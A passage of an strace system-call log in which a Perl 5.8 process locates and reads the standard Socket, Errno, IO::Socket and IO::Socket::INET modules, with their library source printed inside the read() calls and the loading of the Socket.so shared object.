6687  07:15:03.357576 stat64("/usr/local/lib/perl/5.8.8/Socket.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.357590 stat64("/usr/local/share/perl/5.8.8/Socket.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.357602 stat64("/usr/local/share/perl/5.8.8/Socket.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.357616 stat64("/usr/lib/perl5/Socket.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.357628 stat64("/usr/lib/perl5/Socket.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.357641 stat64("/usr/share/perl5/Socket.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.357653 stat64("/usr/share/perl5/Socket.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.357666 stat64("/usr/lib/perl/5.8/Socket.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.357679 stat64("/usr/lib/perl/5.8/Socket.pm", {st_mode=S_IFREG|0644, st_size=3514, ...}) = 0
6687  07:15:03.357700 open("/usr/lib/perl/5.8/Socket.pm", O_RDONLY|O_LARGEFILE) = 8
6687  07:15:03.357714 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfdad368) = -1 ENOTTY (Inappropriate ioctl for device)
6687  07:15:03.357725 _llseek(8, 0, [0], SEEK_CUR) = 0
6687  07:15:03.357770 read(8, "package Socket;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n$VERSION = \"1.78\";\n\nuse Carp;\nuse warnings::register;\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n@EXPORT = qw(\n\tinet_aton inet_ntoa\n\tsockaddr_family\n\tpack_sockaddr_in unpack_sockaddr_in\n\tpack_sockaddr_un unpack_sockaddr_un\n\tsockaddr_in sockaddr_un\n\tINADDR_ANY INADDR_BROADCAST INADDR_LOOPBACK INADDR_NONE\n\tAF_802\n\tAF_AAL\n\tAF_APPLETALK\n\tAF_CCITT\n\tAF_CHAOS\n\tAF_CTF\n\tAF_DATAKIT\n\tAF_DECnet\n\tAF_DLI\n\tAF_ECMA\n\tAF_GOSIP\n\tAF_HYLINK\n\tAF_IMPLINK\n\tAF_INET\n\tAF_INET6\n\tAF_ISO\n\tAF_KEY\n\tAF_LAST\n\tAF_LAT\n\tAF_LINK\n\tAF_MAX\n\tAF_NBS\n\tAF_NIT\n\tAF_NS\n\tAF_OSI\n\tAF_OSINET\n\tAF_PUP\n\tAF_ROUTE\n\tAF_SNA\n\tAF_UNIX\n\tAF_UNSPEC\n\tAF_USER\n\tAF_WAN\n\tAF_X25\n\tIOV_MAX\n\tMSG_BCAST\n\tMSG_BTAG\n\tMSG_CTLFLAGS\n\tMSG_CTLIGNORE\n\tMSG_CTRUNC\n\tMSG_DONTROUTE\n\tMSG_DONTWAIT\n\tMSG_EOF\n\tMSG_EOR\n\tMSG_ERRQUEUE\n\tMSG_ETAG\n\tMSG_FIN\n\tMSG_MAXIOVLEN\n\tMSG_MCAST\n\tMSG_NOSIGNAL\n\tMSG_OOB\n\tMSG_PEEK\n\tMSG_PROXY\n\tMSG_RST\n\tMSG_SYN\n\tMSG_TRUNC\n\tMSG_URG\n\tMSG_WAITALL\n\tMSG_WIRE\n\tPF_802\n\tPF_AAL\n\tPF_APPLETALK\n\tPF_CCITT\n\tPF_CHAOS\n\tPF_CTF\n\tPF_DATAKIT\n\tPF_DECnet\n\tPF_DLI\n\tPF_ECMA\n\tPF_GOSIP\n\tPF_HYLINK\n\tPF_IMPLINK\n\tPF_INET\n\tPF_INET6\n\tPF_ISO\n\tPF_KEY\n\tPF_LAST\n\tPF_LAT\n\tPF_LINK\n\tPF_MAX\n\tPF_NBS\n\tPF_NIT\n\tPF_NS\n\tPF_OSI\n\tPF_OSINET\n\tPF_PUP\n\tPF_ROUTE\n\tPF_SNA\n\tPF_UNIX\n\tPF_UNSPEC\n\tPF_USER\n\tPF_WAN\n\tPF_X25\n\tSCM_CONNECT\n\tSCM_CREDENTIALS\n\tSCM_CREDS\n\tSCM_RIGHTS\n\tSCM_TIMESTAMP\n\tSHUT_RD\n\tSHUT_RDWR\n\tSHUT_WR\n\tSOCK_DGRAM\n\tSOCK_RAW\n\tSOCK_RDM\n\tSOCK_SEQPACKET\n\tSOCK_STREAM\n\tSOL_SOCKET\n\tSOMAXCONN\n\tSO_ACCEPTCONN\n\tSO_ATTACH_FILTER\n\tSO_BACKLOG\n\tSO_BROADCAST\n\tSO_CHAMELEON\n\tSO_DEBUG\n\tSO_DETACH_FILTER\n\tSO_DGRAM_ERRIND\n\tSO_DONTLINGER\n\tSO_DONTROUTE\n\tSO_ERROR\n\tSO_FAMILY\n\tSO_KEEPALIVE\n\tSO_LINGER\n\tSO_OOBINLINE\n\tSO_PASSCRED\n\tSO_PASSIFNAME\n\tSO_PEERCRED\n\tSO_PROTOCOL\n\tSO_PROTOTYPE\n\tSO_RCVBUF\n\tSO_RCVLOWAT\n\tSO_RCVTIMEO\n\tSO_REUSEADDR\n\tSO_REUSEPORT\n\tSO_SECURITY_AUTHENTICATION\n\tSO_SECURITY_ENCRYPTION_NETWORK\n\tSO_SECURITY_ENCRYPTION_TRANSPORT\n\tSO_SNDBUF\n\tSO_SNDLOWAT\n\tSO_SNDTIMEO\n\tSO_STATE\n\tSO_TYPE\n\tSO_USELOOPBACK\n\tSO_XOPEN\n\tSO_XSE\n\tUIO_MAXIOV\n);\n\n@EXPORT_OK = qw(CR LF CRLF $CR $LF $CRLF\n\n\t       IPPROTO_TCP\n\t       TCP_KEEPALIVE\n\t       TCP_MAXRT\n\t       TCP_MAXSEG\n\t       TCP_NODELAY\n\t       TCP_STDURG);\n\n%EXPORT_TAGS = (\n    crlf    => [qw(CR LF CRLF $CR $LF $CRLF)],\n    all     => [@EXPORT, @EXPORT_OK],\n);\n\nBEGIN {\n    sub CR   () {\"\\015\"}\n    sub LF   () {\"\\012\"}\n    sub CRLF () {\"\\015\\012\"}\n}\n\n*CR   = \\CR();\n*LF   = \\LF();\n*CRLF = \\CRLF();\n\nsub sockaddr_in {\n    if (@_ == 6 && !wantarray) { # perl5.001m compat; use this && die\n\tmy($af, $port, @quad) = @_;\n\twarnings::warn \"6-ARG sockaddr_in call is deprecated\" \n\t    if warnings::enabled();\n\tpack_sockaddr_in($port, inet_aton(join(\'.\', @quad)));\n    } elsif (wantarray) {\n\tcroak \"usage:   (port,iaddr) = sockaddr_in(sin_sv)\" unless @_ == 1;\n        unpack_sockaddr_in(@_);\n    } else {\n\tcroak \"usage:   sin_sv = sockaddr_in(port,iaddr))\" unless @_ == 2;\n        pack_sockaddr_in(@_);\n    }\n}\n\nsub sockaddr_un {\n    if (wantarray) {\n\tcroak \"usage:   (filename) = sockaddr_un(sun_sv)\" unless @_ == 1;\n        unpack_sockaddr_un(@_);\n    } else {\n\tcroak \"usage:   sun_sv = sockaddr_un(filename)\" unless @_ == 1;\n        pack_sockaddr_un(@_);\n    }\n}\n\nsub AUTOLOAD {\n    my($constname);\n    ($constname = $AUTOLOAD) =~ s/.*:://;\n    croak \"&Socket::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n\tcroak $error;\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Socket\', $VERSION;\n\n1;\n", 4096) = 3514
6687  07:15:03.358178 brk(0x8239000)    = 0x8239000
6687  07:15:03.358638 read(8, "", 4096) = 0
6687  07:15:03.358853 close(8)          = 0
6687  07:15:03.359028 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.so", {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
6687  07:15:03.359090 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
6687  07:15:03.359137 open("/usr/lib/perl/5.8/auto/Socket/Socket.so", O_RDONLY) = 8
6687  07:15:03.359164 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\16\0\0004\0\0\0\34I\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\264F\0\0\264F\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264F\0\0\264V\0\0\264V\0\0\274\1\0\0\300\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\310F\0\0\310V\0\0\310V\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0%\0\0\0008\0\0\0\0\0\0\0\10\0\0\0\22\0\0\0\35\0\0\0\0\0\0\0)\0\0\0\0\0\0\0\0\0\0\0\7\0\0\0\37\0\0\0\0\0\0\0\0\0\0\0007\0\0\0$\0\0\0-\0\0\0(\0\0\0\36\0\0\0\n\0\0\0,\0\0\0001\0\0\0 \0\0\0\0\0\0\0000\0\0\0\0\0\0\0005\0\0\0!\0\0\0\0\0\0\0\30\0\0\0002\0\0\0\27\0\0\0\'\0\0\0+\0\0\0\f\0\0\0\0\0\0\0.\0\0\0/\0\0\0&\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0*\0\0\0\0\0\0\0\t\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4\0\0\0\17\0\0\0\0\0\0\0\6\0\0\0\20\0\0\0\0\0\0\0\21\0\0\0\24\0\0\0\26\0\0\0\0\0\0\0\23\0\0\0\0\0\0\0\25\0\0\0\0\0\0\0\0\0\0\0\r\0\0\0\0\0\0\0\31\0\0\0003\0\0\0\0\0\0\0\34\0\0\0\0\0\0\0\0\0\0\0%\0\0\0#\0\0\0\5\0\0\0004\0\0\0\0\0\0\0\33\0\0\0", 512) = 512
6687  07:15:03.359267 fstat64(8, {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
6687  07:15:03.359286 mmap2(NULL, 22644, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7d9a000
6687  07:15:03.359300 mmap2(0xb7d9f000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x4) = 0xb7d9f000
6687  07:15:03.359316 close(8)          = 0
6687  07:15:03.359933 brk(0x825a000)    = 0x825a000
6687  07:15:03.360082 stat64("/etc/perl/Errno.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.360103 stat64("/etc/perl/Errno.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.360117 stat64("/usr/local/lib/perl/5.8.8/Errno.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.360130 stat64("/usr/local/lib/perl/5.8.8/Errno.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.360144 stat64("/usr/local/share/perl/5.8.8/Errno.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.360156 stat64("/usr/local/share/perl/5.8.8/Errno.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.360197 stat64("/usr/lib/perl5/Errno.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.360212 stat64("/usr/lib/perl5/Errno.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.360226 stat64("/usr/share/perl5/Errno.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.360252 stat64("/usr/share/perl5/Errno.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.360265 stat64("/usr/lib/perl/5.8/Errno.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.360277 stat64("/usr/lib/perl/5.8/Errno.pm", {st_mode=S_IFREG|0644, st_size=5967, ...}) = 0
6687  07:15:03.360299 open("/usr/lib/perl/5.8/Errno.pm", O_RDONLY|O_LARGEFILE) = 8
6687  07:15:03.360313 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfdad368) = -1 ENOTTY (Inappropriate ioctl for device)
6687  07:15:03.360325 _llseek(8, 0, [0], SEEK_CUR) = 0
6687  07:15:03.360345 read(8, "#\n# This file is auto-generated. ***ANY*** changes here will be lost\n#\n\npackage Errno;\nour (@EXPORT_OK,%EXPORT_TAGS,@ISA,$VERSION,%errno,$AUTOLOAD);\nuse Exporter ();\nuse strict;\n\n$VERSION = \"1.09_01\";\n$VERSION = eval $VERSION;\n@ISA = qw(Exporter);\n\n@EXPORT_OK = qw(EBADR ENOMSG ENOTSUP ESTRPIPE EADDRINUSE EL3HLT EBADF\n\tENOTBLK ENAVAIL ECHRNG ENOTNAM ELNRNG ENOKEY EXDEV EBADE EBADSLT\n\tECONNREFUSED ENOSTR ENONET EOVERFLOW EISCONN EFBIG EKEYREVOKED\n\tECONNRESET EWOULDBLOCK ELIBMAX EREMOTEIO ENOPKG ELIBSCN EDESTADDRREQ\n\tENOTSOCK EIO EMEDIUMTYPE EINPROGRESS ERANGE EAFNOSUPPORT EADDRNOTAVAIL\n\tEINTR EREMOTE EILSEQ ENOMEM EPIPE ENETUNREACH ENODATA EUSERS\n\tEOPNOTSUPP EPROTO EISNAM ESPIPE EALREADY ENAMETOOLONG ENOEXEC EISDIR\n\tEBADRQC EEXIST EDOTDOT ELIBBAD EOWNERDEAD ESRCH EFAULT EXFULL\n\tEDEADLOCK EAGAIN ENOPROTOOPT ENETDOWN EPROTOTYPE EL2NSYNC ENETRESET\n\tEUCLEAN EADV EROFS ESHUTDOWN EMULTIHOP EPROTONOSUPPORT ENFILE ENOLCK\n\tECONNABORTED ECANCELED EDEADLK ESRMNT ENOLINK ETIME ENOTDIR EINVAL\n\tENOTTY ENOANO ELOOP ENOENT EPFNOSUPPORT EBADMSG ENOMEDIUM EL2HLT EDOM\n\tEBFONT EKEYEXPIRED EMSGSIZE ENOCSI EL3RST ENOSPC EIDRM ENOBUFS ENOSYS\n\tEHOSTDOWN EBADFD ENOSR ENOTCONN ESTALE EDQUOT EKEYREJECTED EMFILE\n\tENOTRECOVERABLE EACCES EBUSY E2BIG EPERM ELIBEXEC ETOOMANYREFS ELIBACC\n\tENOTUNIQ ECOMM ERESTART ESOCKTNOSUPPORT EUNATCH ETIMEDOUT ENXIO ENODEV\n\tETXTBSY EMLINK ECHILD EHOSTUNREACH EREMCHG ENOTEMPTY);\n\t\n%EXPORT_TAGS = (\n    POSIX => [qw(\n\tE2BIG EACCES EADDRINUSE EADDRNOTAVAIL EAFNOSUPPORT EAGAIN EALREADY\n\tEBADF EBUSY ECHILD ECONNABORTED ECONNREFUSED ECONNRESET EDEADLK\n\tEDESTADDRREQ EDOM EDQUOT EEXIST EFAULT EFBIG EHOSTDOWN EHOSTUNREACH\n\tEINPROGRESS EINTR EINVAL EIO EISCONN EISDIR ELOOP EMFILE EMLINK\n\tEMSGSIZE ENAMETOOLONG ENETDOWN ENETRESET ENETUNREACH ENFILE ENOBUFS\n\tENODEV ENOENT ENOEXEC ENOLCK ENOMEM ENOPROTOOPT ENOSPC ENOSYS ENOTBLK\n\tENOTCONN ENOTDIR ENOTEMPTY ENOTSOCK ENOTTY ENXIO EOPNOTSUPP EPERM\n\tEPFNOSUPPORT EPIPE EPROTONOSUPPORT EPROTOTYPE ERANGE EREMOTE ERESTART\n\tEROFS ESHUTDOWN ESOCKTNOSUPPORT ESPIPE ESRCH ESTALE ETIMEDOUT\n\tETOOMANYREFS ETXTBSY EUSERS EWOULDBLOCK EXDEV\n    )]\n);\n\nsub EPERM () { 1 }\nsub ENOENT () { 2 }\nsub ESRCH () { 3 }\nsub EINTR () { 4 }\nsub EIO () { 5 }\nsub ENXIO () { 6 }\nsub E2BIG () { 7 }\nsub ENOEXEC () { 8 }\nsub EBADF () { 9 }\nsub ECHILD () { 10 }\nsub EWOULDBLOCK () { 11 }\nsub EAGAIN () { 11 }\nsub ENOMEM () { 12 }\nsub EACCES () { 13 }\nsub EFAULT () { 14 }\nsub ENOTBLK () { 15 }\nsub EBUSY () { 16 }\nsub EEXIST () { 17 }\nsub EXDEV () { 18 }\nsub ENODEV () { 19 }\nsub ENOTDIR () { 20 }\nsub EISDIR () { 21 }\nsub EINVAL () { 22 }\nsub ENFILE () { 23 }\nsub EMFILE () { 24 }\nsub ENOTTY () { 25 }\nsub ETXTBSY () { 26 }\nsub EFBIG () { 27 }\nsub ENOSPC () { 28 }\nsub ESPIPE () { 29 }\nsub EROFS () { 30 }\nsub EMLINK () { 31 }\nsub EPIPE () { 32 }\nsub EDOM () { 33 }\nsub ERANGE () { 34 }\nsub EDEADLOCK () { 35 }\nsub EDEADLK () { 35 }\nsub ENAMETOOLONG () { 36 }\nsub ENOLCK () { 37 }\nsub ENOSYS () { 38 }\nsub ENOTEMPTY () { 39 }\nsub ELOOP () { 40 }\nsub ENOMSG () { 42 }\nsub EIDRM () { 43 }\nsub ECHRNG () { 44 }\nsub EL2NSYNC () { 45 }\nsub EL3HLT () { 46 }\nsub EL3RST () { 47 }\nsub ELNRNG () { 48 }\nsub EUNATCH () { 49 }\nsub ENOCSI () { 50 }\nsub EL2HLT () { 51 }\nsub EBADE () { 52 }\nsub EBADR () { 53 }\nsub EXFULL () { 54 }\nsub ENOANO () { 55 }\nsub EBADRQC () { 56 }\nsub EBADSLT () { 57 }\nsub EBFONT () { 59 }\nsub ENOSTR () { 60 }\nsub ENODATA () { 61 }\nsub ETIME () { 62 }\nsub ENOSR () { 63 }\nsub ENONET () { 64 }\nsub ENOPKG () { 65 }\nsub EREMOTE () { 66 }\nsub ENOLINK () { 67 }\nsub EADV () { 68 }\nsub ESRMNT () { 69 }\nsub ECOMM () { 70 }\nsub EPROTO () { 71 }\nsub EMULTIHOP () { 72 }\nsub EDOTDOT () { 73 }\nsub EBADMSG () { 74 }\nsub EOVERFLOW () { 75 }\nsub ENOTUNIQ () { 76 }\nsub EBADFD () { 77 }\nsub EREMCHG () { 78 }\nsub ELIBACC () { 79 }\nsub ELIBBAD () { 80 }\nsub ELIBSCN () { 81 }\nsub ELIBMAX () { 82 }\nsub ELIBEXEC () { 83 }\nsub EILSEQ () { 84 }\nsub ERESTART () { 85 }\nsub ESTRPIPE () { 86 }\nsub EUSERS () { 87 }\nsub ENOTSOCK () { 88 }\nsub EDESTADDRREQ () { 89 }\nsub EMSGSIZE () { 90 }\nsub EPROTOTYPE () { 91 }\nsub ENOPROTOOPT () { 92 }\nsub EPROTONOSUPPORT () ", 4096) = 4096
6687  07:15:03.361173 read(8, "{ 93 }\nsub ESOCKTNOSUPPORT () { 94 }\nsub ENOTSUP () { 95 }\nsub EOPNOTSUPP () { 95 }\nsub EPFNOSUPPORT () { 96 }\nsub EAFNOSUPPORT () { 97 }\nsub EADDRINUSE () { 98 }\nsub EADDRNOTAVAIL () { 99 }\nsub ENETDOWN () { 100 }\nsub ENETUNREACH () { 101 }\nsub ENETRESET () { 102 }\nsub ECONNABORTED () { 103 }\nsub ECONNRESET () { 104 }\nsub ENOBUFS () { 105 }\nsub EISCONN () { 106 }\nsub ENOTCONN () { 107 }\nsub ESHUTDOWN () { 108 }\nsub ETOOMANYREFS () { 109 }\nsub ETIMEDOUT () { 110 }\nsub ECONNREFUSED () { 111 }\nsub EHOSTDOWN () { 112 }\nsub EHOSTUNREACH () { 113 }\nsub EALREADY () { 114 }\nsub EINPROGRESS () { 115 }\nsub ESTALE () { 116 }\nsub EUCLEAN () { 117 }\nsub ENOTNAM () { 118 }\nsub ENAVAIL () { 119 }\nsub EISNAM () { 120 }\nsub EREMOTEIO () { 121 }\nsub EDQUOT () { 122 }\nsub ENOMEDIUM () { 123 }\nsub EMEDIUMTYPE () { 124 }\nsub ECANCELED () { 125 }\nsub ENOKEY () { 126 }\nsub EKEYEXPIRED () { 127 }\nsub EKEYREVOKED () { 128 }\nsub EKEYREJECTED () { 129 }\nsub EOWNERDEAD () { 130 }\nsub ENOTRECOVERABLE () { 131 }\n\nsub TIEHASH { bless [] }\n\nsub FETCH {\n    my ($self, $errname) = @_;\n    my $proto = prototype(\"Errno::$errname\");\n    my $errno = \"\";\n    if (defined($proto) && $proto eq \"\") {\n\tno strict \'refs\';\n\t$errno = &$errname;\n        $errno = 0 unless $! == $errno;\n    }\n    return $errno;\n}\n\nsub STORE {\n    require Carp;\n    Carp::confess(\"ERRNO hash is read only!\");\n}\n\n*CLEAR = \\&STORE;\n*DELETE = \\&STORE;\n\nsub NEXTKEY {\n    my($k,$v);\n    while(($k,$v) = each %Errno::) {\n\tmy $proto = prototype(\"Errno::$k\");\n\tlast if (defined($proto) && $proto eq \"\");\n    }\n    $k\n}\n\nsub FIRSTKEY {\n    my $s = scalar keys %Errno::;\t# initialize iterator\n    goto &NEXTKEY;\n}\n\nsub EXISTS {\n    my ($self, $errname) = @_;\n    my $r = ref $errname;\n    my $proto = !$r || $r eq \'CODE\' ? prototype($errname) : undef;\n    defined($proto) && $proto eq \"\";\n}\n\ntie %!, __PACKAGE__;\n\n1;\n__END__\n\n", 4096) = 1871
6687  07:15:03.361620 _llseek(8, 5966, [5966], SEEK_SET) = 0
6687  07:15:03.361637 _llseek(8, 0, [5966], SEEK_CUR) = 0
6687  07:15:03.361647 close(8)          = 0
6687  07:15:03.362033 brk(0x827b000)    = 0x827b000
6687  07:15:03.362161 read(6, "    }\n\n    $peer = accept($new,$sock)\n\tor return;\n\n    return wantarray ? ($new, $peer)\n    \t      \t     : $new;\n}\n\nsub sockname {\n    @_ == 1 or croak \'usage: $sock->sockname()\';\n    getsockname($_[0]);\n}\n\nsub peername {\n    @_ == 1 or croak \'usage: $sock->peername()\';\n    my($sock) = @_;\n    getpeername($sock)\n      || ${*$sock}{\'io_socket_peername\'}\n      || undef;\n}\n\nsub connected {\n    @_ == 1 or croak \'usage: $sock->connected()\';\n    my($sock) = @_;\n    getpeername($sock);\n}\n\nsub send {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $sock->send(BUF, [FLAGS, [TO]])\';\n    my $sock  = $_[0];\n    my $flags = $_[2] || 0;\n    my $peer  = $_[3] || $sock->peername;\n\n    croak \'send: Cannot determine peer address\'\n\t unless($peer);\n\n    my $r = defined(getpeername($sock))\n\t? send($sock, $_[1], $flags)\n\t: send($sock, $_[1], $flags, $peer);\n\n    # remember who we send to, if it was successful\n    ${*$sock}{\'io_socket_peername\'} = $peer\n\tif(@_ == 4 && defined $r);\n\n    $r;\n}\n\nsub recv {\n    @_ == 3 || @_ == 4 or croak \'usage: $sock->recv(BUF, LEN [, FLAGS])\';\n    my $sock  = $_[0];\n    my $len   = $_[2];\n    my $flags = $_[3] || 0;\n\n    # remember who we recv\'d from\n    ${*$sock}{\'io_socket_peername\'} = recv($sock, $_[1]=\'\', $len, $flags);\n}\n\nsub shutdown {\n    @_ == 2 or croak \'usage: $sock->shutdown(HOW)\';\n    my($sock, $how) = @_;\n    shutdown($sock, $how);\n}\n\nsub setsockopt {\n    @_ == 4 or croak \'$sock->setsockopt(LEVEL, OPTNAME)\';\n    setsockopt($_[0],$_[1],$_[2],$_[3]);\n}\n\nmy $intsize = length(pack(\"i\",0));\n\nsub getsockopt {\n    @_ == 3 or croak \'$sock->getsockopt(LEVEL, OPTNAME)\';\n    my $r = getsockopt($_[0],$_[1],$_[2]);\n    # Just a guess\n    $r = unpack(\"i\", $r)\n\tif(defined $r && length($r) == $intsize);\n    $r;\n}\n\nsub sockopt {\n    my $sock = shift;\n    @_ == 1 ? $sock->getsockopt(SOL_SOCKET,@_)\n\t    : $sock->setsockopt(SOL_SOCKET,@_);\n}\n\nsub atmark {\n    @_ == 1 or croak \'usage: $sock->atmark()\';\n    my($sock) = @_;\n    sockatmark($sock);\n}\n\nsub timeout {\n    @_ == 1 || @_ == 2 or croak \'usage: $sock->timeout([VALUE])\';\n    my($sock,$val) = @_;\n    my $r = ${*$sock}{\'io_socket_timeout\'};\n\n    ${*$sock}{\'io_socket_timeout\'} = defined $val ? 0 + $val : $val\n\tif(@_ == 2);\n\n    $r;\n}\n\nsub sockdomain {\n    @_ == 1 or croak \'usage: $sock->sockdomain()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_domain\'};\n}\n\nsub socktype {\n    @_ == 1 or croak \'usage: $sock->socktype()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_type\'}\n}\n\nsub protocol {\n    @_ == 1 or croak \'usage: $sock->protocol()\';\n    my($sock) = @_;\n    ${*$sock}{\'io_socket_proto\'};\n}\n\n1;\n\n__END__\n\n", 4096) = 2603
6687  07:15:03.362656 _llseek(6, 6698, [6698], SEEK_SET) = 0
6687  07:15:03.362672 _llseek(6, 0, [6698], SEEK_CUR) = 0
6687  07:15:03.362682 close(6)          = 0
6687  07:15:03.362702 stat64("/etc/perl/IO/Socket/INET.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.362716 stat64("/etc/perl/IO/Socket/INET.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.362731 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.362773 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.362788 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.362816 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.362830 stat64("/usr/lib/perl5/IO/Socket/INET.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.362842 stat64("/usr/lib/perl5/IO/Socket/INET.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.362856 stat64("/usr/share/perl5/IO/Socket/INET.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.362868 stat64("/usr/share/perl5/IO/Socket/INET.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.362882 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.362899 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pm", {st_mode=S_IFREG|0644, st_size=6497, ...}) = 0
6687  07:15:03.362921 open("/usr/lib/perl/5.8/IO/Socket/INET.pm", O_RDONLY|O_LARGEFILE) = 6
6687  07:15:03.362936 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfdad818) = -1 ENOTTY (Inappropriate ioctl for device)
6687  07:15:03.362948 _llseek(6, 0, [0], SEEK_CUR) = 0
6687  07:15:03.362965 read(6, "# IO::Socket::INET.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::INET;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\nuse Exporter;\nuse Errno;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.29\";\n\nmy $EINVAL = exists(&Errno::EINVAL) ? Errno::EINVAL() : 1;\n\nIO::Socket::INET->register_domain( AF_INET );\n\nmy %socket_type = ( tcp  => SOCK_STREAM,\n\t\t    udp  => SOCK_DGRAM,\n\t\t    icmp => SOCK_RAW\n\t\t  );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"PeerAddr\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub _sock_info {\n  my($addr,$port,$proto) = @_;\n  my $origport = $port;\n  my @proto = ();\n  my @serv = ();\n\n  $port = $1\n\tif(defined $addr && $addr =~ s,:([\\w\\(\\)/]+)$,,);\n\n  if(defined $proto  && $proto =~ /\\D/) {\n    if(@proto = getprotobyname($proto)) {\n      $proto = $proto[2] || undef;\n    }\n    else {\n      $@ = \"Bad protocol \'$proto\'\";\n      return;\n    }\n  }\n\n  if(defined $port) {\n    my $defport = ($port =~ s,\\((\\d+)\\)$,,) ? $1 : undef;\n    my $pnum = ($port =~ m,^(\\d+)$,)[0];\n\n    @serv = getservbyname($port, $proto[0] || \"\")\n\tif ($port =~ m,\\D,);\n\n    $port = $serv[2] || $defport || $pnum;\n    unless (defined $port) {\n\t$@ = \"Bad service \'$origport\'\";\n\treturn;\n    }\n\n    $proto = (getprotobyname($serv[3]))[2] || undef\n\tif @serv && !$proto;\n  }\n\n return ($addr || undef,\n\t $port || undef,\n\t $proto || undef\n\t);\n}\n\nsub _error {\n    my $sock = shift;\n    my $err = shift;\n    {\n      local($!);\n      my $title = ref($sock).\": \";\n      $@ = join(\"\", $_[0] =~ /^$title/ ? \"\" : $title, @_);\n      close($sock)\n\tif(defined fileno($sock));\n    }\n    $! = $err;\n    return undef;\n}\n\nsub _get_addr {\n    my($sock,$addr_str, $multi) = @_;\n    my @addr;\n    if ($multi && $addr_str !~ /^\\d+(?:\\.\\d+){3}$/) {\n\t(undef, undef, undef, undef, @addr) = gethostbyname($addr_str);\n    } else {\n\tmy $h = inet_aton($addr_str);\n\tpush(@addr, $h) if defined $h;\n    }\n    @addr;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    